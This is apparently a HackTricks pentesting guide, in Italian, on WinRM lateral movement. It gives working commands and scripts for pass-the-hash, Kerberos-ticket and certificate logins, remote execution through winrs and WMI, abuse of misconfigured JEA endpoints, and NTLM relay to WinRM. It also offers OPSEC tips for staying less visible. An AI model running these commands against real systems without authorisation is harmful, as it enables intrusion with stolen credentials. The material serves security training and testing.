# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM è uno dei trasporti di **lateral movement** più comodi negli ambienti Windows perché ti dà una shell remota su **WS-Man/HTTP(S)** senza bisogno di trucchi per la creazione di servizi SMB. Se il target espone **5985/5986** e il tuo principal è autorizzato a usare il remoting, spesso puoi passare da "valid creds" a "interactive shell" molto rapidamente.

Per la **protocol/service enumeration**, i listener, l'abilitazione di WinRM, `Invoke-Command` e l'uso generico del client, controlla:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Usa **HTTP/HTTPS** invece di SMB/RPC, quindi spesso funziona dove l'esecuzione in stile PsExec è bloccata.
- Con **Kerberos**, evita di inviare credenziali riutilizzabili al target.
- Funziona bene da tooling **Windows**, **Linux** e **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Il percorso interattivo di PowerShell remoting avvia **`wsmprovhost.exe`** sul target nel contesto dell'utente autenticato, il che è operativamente diverso dall'esecuzione basata su service.

## Access model and prerequisites

In pratica, il successo del WinRM lateral movement dipende da **tre** cose:

1. Il target ha un **WinRM listener** (`5985`/`5986`) e regole firewall che consentono l'accesso.
2. L'account può **autenticarsi** all'endpoint.
3. L'account è autorizzato ad **aprire una remoting session**.

Modi comuni per ottenere quell'accesso:

- **Local Administrator** sul target.
- Appartenenza a **Remote Management Users** sui sistemi più recenti oppure **WinRMRemoteWMIUsers__** sui sistemi/componenti che ancora rispettano quel gruppo.
- Diritti di remoting espliciti delegati tramite local security descriptors / modifiche alle ACL di PowerShell remoting.

Se controlli già una macchina con diritti admin, ricorda che puoi anche **delegare l'accesso WinRM senza una membership completa nel gruppo admin** usando le tecniche descritte qui:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**. Se ti connetti tramite IP, il client di solito ricade su **NTLM/Negotiate**.
- In casi di **workgroup** o cross-trust edge cases, NTLM richiede spesso **HTTPS** oppure che il target venga aggiunto a **TrustedHosts** sul client.
- Con gli **account locali** via Negotiate in un workgroup, le restrizioni UAC remote possono impedire l'accesso a meno che non venga usato l'account Administrator integrato oppure `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting usa di default lo **`HTTP/<host>` SPN**. In ambienti dove **`HTTP/<host>`** è già registrato su un altro service account, il WinRM Kerberos può fallire con `0x80090322`; usa uno SPN qualificato dalla porta oppure passa a **`WSMAN/<host>`** dove quello SPN esiste.

Se ottieni credenziali valide durante il password spraying, validarle via WinRM è spesso il modo più rapido per verificare se si trasformano in una shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM per shell interattive

`evil-winrm` rimane l'opzione interattiva più comoda da Linux perché supporta **password**, **NT hashes**, **Kerberos tickets**, **client certificates**, trasferimento file e caricamento in-memory di PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Caso limite Kerberos SPN: `HTTP` vs `WSMAN`

Quando il default **`HTTP/<host>`** SPN causa errori Kerberos, prova a richiedere/usare invece un ticket **`WSMAN/<host>`**. Questo si verifica in setup enterprise hardenizzati o insoliti, dove `HTTP/<host>` è già associato a un altro service account.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Questo è utile anche dopo un abuso di **RBCD / S4U** quando hai forgiato o richiesto specificamente un ticket di servizio **WSMAN** invece di un ticket generico `HTTP`.

### Certificate-based authentication

WinRM supporta anche l'**autenticazione tramite certificato client**, ma il certificato deve essere mappato sul target a un **local account**. Dal punto di vista offensivo, questo è rilevante quando:

- hai già rubato/esportato un certificato client valido e la chiave privata già mappati per WinRM;
- hai abusato di **AD CS / Pass-the-Certificate** per ottenere un certificato per un principal e poi pivotare verso un altro percorso di autenticazione;
- stai operando in ambienti che evitano deliberatamente il remoting basato su password.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Il client-certificate WinRM è molto meno comune rispetto all’autenticazione password/hash/Kerberos, ma quando esiste può fornire un percorso di **passwordless lateral movement** che sopravvive alla rotazione delle password.

### Python / automation con `pypsrp`

Se hai bisogno di automazione invece di una shell operativa, `pypsrp` ti offre WinRM/PSRP da Python con supporto a **NTLM**, **certificate auth**, **Kerberos** e **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Se hai bisogno di un controllo più preciso rispetto al wrapper `Client` di alto livello, le API `WSMan` + `RunspacePool` di livello inferiore sono utili per due problemi comuni dell’operatore:

- forzare **`WSMAN`** come servizio/SPN Kerberos invece dell’aspettativa predefinita `HTTP` usata da molti client PowerShell;
- connettersi a un **endpoint PSRP non predefinito** come una **JEA** / configurazione di sessione custom invece di `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Endpoints PSRP personalizzati e JEA contano durante il lateral movement

Un'autenticazione WinRM riuscita **non** significa sempre che tu finisca nell'endpoint predefinito e senza restrizioni `Microsoft.PowerShell`. Ambienti maturi possono esporre **custom session configurations** o endpoint **JEA** con le proprie ACL e comportamento run-as.

Se hai già code execution su un host Windows e vuoi capire quali superfici di remoting esistono, enumera gli endpoint registrati:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Quando esiste un endpoint utile, prendilo di mira esplicitamente invece della shell predefinita:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Implicazioni offensive pratiche:

- Un endpoint **restricted** può comunque essere sufficiente per il lateral movement se espone i cmdlet/funzioni giusti per il controllo dei servizi, l’accesso ai file, la creazione di processi o l’esecuzione arbitraria di .NET / comandi esterni.
- Un ruolo JEA **misconfigured** è particolarmente utile quando espone comandi pericolosi come `Start-Process`, wildcard ampi, provider scrivibili o funzioni proxy personalizzate che ti permettono di uscire dalle restrizioni previste.
- Gli endpoint basati su account virtuali **RunAs** o **gMSAs** modificano il contesto di sicurezza effettivo dei comandi che esegui. In particolare, un endpoint basato su gMSA può fornire **network identity sul secondo hop** anche quando una normale sessione WinRM incontrerebbe il classico problema di delegation.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` è integrato ed è utile quando vuoi **native WinRM command execution** senza aprire una sessione interattiva di PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Due flag sono facili da dimenticare e contano nella pratica:

- `/noprofile` è spesso richiesto quando il principal remoto **non** è un amministratore locale.
- `/allowdelegate` consente alla shell remota di usare le tue credenziali contro un **terzo host** (per esempio, quando il comando ha bisogno di `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operativamente, `winrs.exe` spesso dà origine a una catena di processi remota simile a:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Questo vale la pena ricordarlo perché differisce dall'exec basato su service e dalle sessioni PSRP interattive.

### `winrm.cmd` / WS-Man COM invece di PowerShell remoting

Puoi anche eseguire tramite **WinRM transport** senza `Enter-PSSession` invocando classi WMI tramite WS-Man. Questo mantiene il transport come WinRM mentre il primitive di esecuzione remota diventa **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Questo approccio è utile quando:

- Il logging di PowerShell è fortemente monitorato.
- Vuoi il **trasporto WinRM** ma non un classico workflow di remoting PS.
- Stai costruendo o usando tooling personalizzato attorno all’oggetto COM **`WSMan.Automation`**.

## NTLM relay a WinRM (WS-Man)

Quando SMB relay è bloccato dal signing e LDAP relay è limitato, **WS-Man/WinRM** può comunque essere un target di relay interessante. `ntlmrelayx.py` moderno include **WinRM relay servers** e può fare relay verso target **`wsman://`** o **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Due note pratiche:

- Relay è più utile quando il target accetta **NTLM** e il principal relayato è autorizzato a usare WinRM.
- Il codice recente di Impacket gestisce in modo specifico le richieste **`WSMANIDENTIFY: unauthenticated`** così le verifiche in stile `Test-WSMan` non interrompono il flusso del relay.

Per i vincoli multi-hop dopo aver ottenuto una prima sessione WinRM, controlla:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Note OPSEC e detection

- Il **PowerShell remoting** interattivo di solito crea **`wsmprovhost.exe`** sul target.
- **`winrs.exe`** in genere crea **`winrshost.exe`** e poi il processo figlio richiesto.
- Gli endpoint **JEA** personalizzati possono eseguire azioni come account virtuali **`WinRM_VA_*`** o come **gMSA** configurato, il che cambia sia la telemetria sia il comportamento del secondo hop rispetto a una shell normale nel contesto utente.
- Aspettati telemetria di **network logon**, eventi del servizio WinRM e logging operativo/script-block di PowerShell se usi PSRP invece di `cmd.exe` grezzo.
- Se ti serve solo un singolo comando, `winrs.exe` o l’esecuzione WinRM one-shot può essere più discreta di una sessione remota interattiva di lunga durata.
- Se Kerberos è disponibile, preferisci **FQDN + Kerberos** invece di IP + NTLM per ridurre sia i problemi di trust sia le modifiche scomode lato client a `TrustedHosts`.

## References

- [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [pypsrp README](https://github.com/jborean93/pypsrp)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
